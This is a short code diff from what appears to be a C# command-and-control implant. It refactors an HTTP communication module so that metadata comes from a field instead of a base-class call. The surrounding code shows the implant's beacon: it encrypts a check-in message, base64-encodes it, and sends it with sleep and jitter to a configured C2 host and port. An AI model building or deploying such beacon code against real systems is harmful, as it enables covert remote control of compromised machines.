@@ -11,7 +11,7 @@ class HttpCommModule : CommModule
     static int SleepInterval;
     static int SleepJitter;
 
-    public HttpCommModule(string agentID, string connectHost, int connectPort, int sleepInterval, int sleepJitter) : base(agentID)
+    public HttpCommModule(string connectHost, int connectPort, int sleepInterval, int sleepJitter)
     {
         ConnectHost = connectHost;
         ConnectPort = connectPort;
@@ -42,7 +42,7 @@ class HttpCommModule : CommModule
         var client = GetWebClient();
         var message = new AgentMessage
         {
-            Metadata = base.GetMetadata(),
+            Metadata = Metadata,
             Data = new C2Data
             {
                 Module = "Core",
@@ -74,7 +74,7 @@ class HttpCommModule : CommModule
         else
         {
             client.DownloadDataCompleted += DownloadDataCallBack;
-            outMessage = Crypto.Encrypt(new AgentMessage { IdempotencyKey = Guid.NewGuid().ToString(), Metadata = base.GetMetadata(), Data = new C2Data { Module = "Core", Command = "NOP" } });
+            outMessage = Crypto.Encrypt(new AgentMessage { IdempotencyKey = Guid.NewGuid().ToString(), Metadata = Metadata, Data = new C2Data { Module = "Core", Command = "NOP" } });
             dataToSend = $"Message={Convert.ToBase64String(outMessage)}";
             uri = new Uri($"http://{ConnectHost}:{ConnectPort}?{dataToSend}");
             client.DownloadDataAsync(uri);
